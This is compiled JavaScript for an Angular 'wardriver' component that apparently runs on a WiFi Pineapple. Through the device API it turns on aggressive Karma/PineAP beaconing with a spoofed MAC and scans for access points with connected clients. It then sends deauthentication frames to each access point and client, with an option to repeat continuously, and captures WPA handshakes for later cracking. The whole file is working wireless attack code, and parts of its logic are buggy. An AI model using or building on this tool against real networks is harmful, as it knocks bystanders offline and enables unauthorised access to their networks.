"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
exports.__esModule = true;
exports.WarDriverComponent = void 0;
var core_1 = require("@angular/core");
var async_1 = require("async");
var WarDriverComponent = /** @class */ (function () {
    function WarDriverComponent(API) {
        this.API = API;
        this.apiResponse = 'Unfulfilled Response';
        this.statusHeader = '';
        this.statusFileName = '';
        this.continousDeauth = false;
    }
    WarDriverComponent.prototype.populateTargetBSSIDs = function () {
        var _this = this;
        this.API.APIGet('/api/pineap/ssids', function (resp) {
            _this.apiResponse = resp.ssids;
        });
    };
    WarDriverComponent.prototype.get_status_file_name = function () {
        var _this = this;
        this.API.request({
            module: 'wardriver',
            action: 'build_status_file'
        }, function (resp) {
            _this.statusFileName = resp;
        });
        return this.statusFileName;
    };
    WarDriverComponent.prototype.get_status_file = function (statusFileName) {
        var _this = this;
        this.API.request({
            module: 'wardriver',
            action: 'get_status_file',
            file_name: this.statusFileName
        }, function (resp) {
            var json_file = resp;
            _this.json_frontend = json_file;
            console.log(json_file);
        });
    };
    WarDriverComponent.prototype.get_status = function () {
        var statusFileName = this.get_status_file_name();
        this.get_status_file(statusFileName);
        //this.render_status();
    };
    WarDriverComponent.prototype.attackd = function (scanResultsArray) {
        var _this = this;
        this.API.APIGet('/api/pineap/handshakes', function (resp) {
            if (resp.handshakes != null) {
                scanResultsArray.forEach(function (ap) {
                    var ap_deauth_payload = {
                        bssid: ap.bssid,
                        multiplier: 1,
                        channel: 11,
                        clients: [] // ??  "clients": string[] | https://hak5.github.io/mk7-docs/docs/rest/pineap/pineap/
                    };
                    _this.API.APIPost('/api/pineap/deauth/ap', ap_deauth_payload, function (resp) {
                        console.log('>ap deauthd: ' + ap.bssid);
                    }).forEach(function (client) {
                        var client_deauth_payload = {
                            bssid: ap.bssid,
                            mac: client.client_mac,
                            multiplier: 1,
                            channel: 11
                        };
                        _this.API.APIPost('/api/pineap/deauth/client', client_deauth_payload, function (resp) {
                            console.log('>deauthd: ' + client.client_mac);
                        });
                    });
                });
            }
        });
        console.log('>cooling down breifly, waiting for straggling handshakes');
        setTimeout(function () {
            _this.API.APIPost('/api/pineap/handshakes/stop', null, function (resp) {
                console.log('>stopped handshake capture');
                _this.API.APIGet('/api/pineap/handshakes', function (resp) {
                    if (resp.handshakes.length > 0) {
                        console.log('>handshakes found!');
                        var notification_payload = {
                            level: 1,
                            message: "HANDSHAKE FOUND!!!",
                            module_name: 'wardriver'
                        };
                        _this.API.APIPut('/api/notifications', notification_payload, function (resp) { });
                    }
                    else {
                        console.log('>no handshakes found :(');
                    }
                });
            });
        }, 20000);
        if (this.continousDeauth) {
            this.attackd(scanResultsArray);
        }
    };
    WarDriverComponent.prototype.run_scand = function () {
        var _this = this;
        var scan_opts = {
            "live": false,
            "scan_time": 30,
            "band": "0"
        };
        var pineAP_aggro_settings = {
            'mode': 'advanced',
            'settings': {
                'ap_channel': '11',
                'autostart': true,
                'autostartPineAP': true,
                'beacon_interval': 'AGGRESSIVE',
                'beacon_response_interval': 'AGGRESSIVE',
                'beacon_responses': true,
                'broadcast_ssid_pool': false,
                'capture_ssids': true,
                'connect_notifications': false,
                'disconnect_notifications': false,
                'enablePineAP': true,
                'karma': true,
                'logging': true,
                'pineap_mac': '5A:11:B0:A7:A9:09',
                'target_mac': 'FF:FF:FF:FF:FF:FF'
            }
        };
        var self = this;
        this.API.APIPut('/api/pineap/settings', pineAP_aggro_settings, function (resp) {
            _this.API.APIPost('/api/recon/stop', null, function (resp) {
                _this.API.APIPost('/api/recon/start', scan_opts, function (resp) {
                    // notify end user of 30 second wait
                    setTimeout(function () {
                        _this.API.APIGet('/api/recon/scans/' + resp.scanID, function (resp) {
                            console.log('>apr len: ' + resp.APResults.length);
                            if (resp.APResults.length > 0) {
                                resp.APResults.forEach(function (ap) {
                                    if (ap.clients != null) {
                                        ap.clients.forEach(function (client) {
                                            console.log('>client found!: ' + client.client_mac);
                                            self.scanResultsArray.push(ap);
                                        });
                                    }
                                    else {
                                        console.log('>AP found, but not with associated clients');
                                    }
                                });
                                if (self.scanResultsArray != null)
                                    _this.attackd(self.scanResultsArray);
                                else
                                    console.log('>sorry, nothing to attack');
                            }
                            else {
                                console.log('>no APs found');
                            }
                        });
                    }, 120000);
                });
            });
        });
    };
    WarDriverComponent.prototype.ngOnInit = function () {
        //this.populateTargetBSSIDs();
        //this.get_status();
        var pineAP_aggro_settings = {
            'mode': 'advanced',
            'settings': {
                'ap_channel': '11',
                'autostart': true,
                'autostartPineAP': true,
                'beacon_interval': 'AGGRESSIVE',
                'beacon_response_interval': 'AGGRESSIVE',
                'beacon_responses': true,
                'broadcast_ssid_pool': false,
                'capture_ssids': true,
                'connect_notifications': false,
                'disconnect_notifications': false,
                'enablePineAP': true,
                'karma': true,
                'logging': true,
                'pineap_mac': '5A:11:B0:A7:A9:09',
                'target_mac': 'FF:FF:FF:FF:FF:FF'
            }
        };
        //var async = require('async');
        async_1.async.series([
            this.API.APIPut('/api/pineap/settings', pineAP_aggro_settings, function (resp) { if (resp.success) {
                return true;
            } }),
            this.API.APIPost('/api/recon/stop', null, function (resp) { if (resp.success) {
                return true;
            } })
        ], function (err, results) {
            //
        });
        //this.run_scand();
    };
    WarDriverComponent = __decorate([
        (0, core_1.Component)({
            selector: 'lib-wardriver',
            templateUrl: './wardriver.component.html',
            styleUrls: ['./wardriver.component.css']
        })
    ], WarDriverComponent);
    return WarDriverComponent;
}());
exports.WarDriverComponent = WarDriverComponent;
